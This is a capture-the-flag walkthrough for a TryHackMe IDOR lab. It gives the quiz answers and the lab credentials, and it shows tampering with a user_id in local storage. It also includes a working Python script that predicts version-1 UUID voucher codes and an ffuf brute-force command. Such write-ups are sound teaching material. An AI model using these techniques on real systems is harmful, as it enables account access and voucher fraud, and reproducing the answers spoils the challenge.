# URL
https://tryhackme.com/room/idor-aoc2025-zl6MywQid9
# Concept
* IDOR (insecure direct object reference)
# Method of solve
* in the AttackBox, start up its Firefox web browser and navigate to the web app associated with the room (a link can be found above the `Your virtual environment has been set up` heading in Task 1)
## Q1 - What does IDOR stand for?
* insecure direct object reference
## Q2 - What type of privilege escalation are most IDOR cases?
* horizontal
## Q3 - Exploiting the IDOR found in the view_accounts parameter, what is the user_id of the parent that has 10 children?
* login to the web app using the provided credentials, username `niels`, password `TryHackMe#2025`
* open the web developer tools (keyboard shortcut `ctrl + shift + I`)
* navigate to the `storage` tab
* navigate to `local storage` on the left-hand menu
* change the value of the `auth_user` cookie to the value `15` in the `user_id` key
## B1 - Bonus Task: If you want to dive even deeper, use either the base64 or md5 child endpoint and try to find the id_number of the child born on 2019-04-17? To make the iteration faster, consider using something like Burp's Intruder. If you want to check your answer, click the hint on the question.
* the answer to this question is actually one of the `user_id:15` children
## B2 - Bonus Task: Want to go even further? Using the /parents/vouchers/claim endpoint, find the voucher that is valid on 20 November 2025. Insider information tells you that the voucher was generated exactly on the minute somewhere between 20:00 - 24:00 UTC that day. What is the voucher code? If you want to check your answer, click the hint on the question.
* the voucher values are in UUID format, and we can learn more about them by putting one of the values into a website like `https://www.uuidtools.com/decode`
* according to the decoder, the version of UUID that is being used is version 1, which can be predictably reproduced
```
#!/usr/bin/env python3
import uuid
import datetime as dt

# Your extracted fields
NODE = 0x026ccdf7d769
CLOCK_SEQ = 0x2C99  # 14-bit clock sequence derived from your UUID

# Gregorian epoch for UUID timestamps
GREGORIAN_EPOCH = dt.datetime(1582, 10, 15, tzinfo=dt.timezone.utc)

def uuid1_for_datetime(ts_dt, node=NODE, clock_seq=CLOCK_SEQ):
    """Generate UUIDv1 matching the structure of the sample UUID."""
    # Ensure timezone awareness
    if ts_dt.tzinfo is None:
        ts_dt = ts_dt.replace(tzinfo=dt.timezone.utc)

    # Compute 100-ns intervals since the UUID epoch (1582)
    delta = ts_dt - GREGORIAN_EPOCH
    timestamp = int(delta.total_seconds() * 10**7)

    # Split timestamp into UUID fields
    time_low  = timestamp & 0xFFFFFFFF
    time_mid  = (timestamp >> 32) & 0xFFFF
    time_hi   = (timestamp >> 48) & 0x0FFF
    time_hi_and_version = time_hi | (1 << 12)  # version = 1

    # 14-bit clock sequence, add variant in high bits
    clock_seq &= 0x3FFF  # enforce 14-bit
    clock_seq_low = clock_seq & 0xFF
    clock_seq_hi_variant = ((clock_seq >> 8) & 0x3F) | 0x80

    fields = (
        time_low,
        time_mid,
        time_hi_and_version,
        clock_seq_hi_variant,
        clock_seq_low,
        node
    )

    return uuid.UUID(fields=fields, version=1)

def main():
    # Time window: 20 Nov 2025 20:00 -> 21 Nov 2025 00:00 inclusive
    start = dt.datetime(2025, 11, 20, 20, 0, tzinfo=dt.timezone.utc)
    end   = dt.datetime(2025, 11, 21,  0, 0, tzinfo=dt.timezone.utc)

    ts = start
    while ts <= end:
        print(ts.isoformat(), "->", uuid1_for_datetime(ts))
        ts += dt.timedelta(minutes=1)

if __name__ == "__main__":
    main()
```
* at the `/parents/vouchers` endpoint, we see that there is a function which lets us redeem vouchers
* the green button is labelled `Claim Voucher`
* record that request in Burp Suite, then save it as a file named `request.txt`
* make sure to edit the `request.txt` file so that the `code` value is `FUZZ`
* run the Python script so to create a list of UUID values to compare
```
python3 uuid_thing.py | cut -d " " -f 3 > list.txt
```
* this ffuf command will brute force valid voucher codes from the web server:
```
ffuf -request request.txt -w list.txt --request-proto HTTP -mc all -fc 404
```
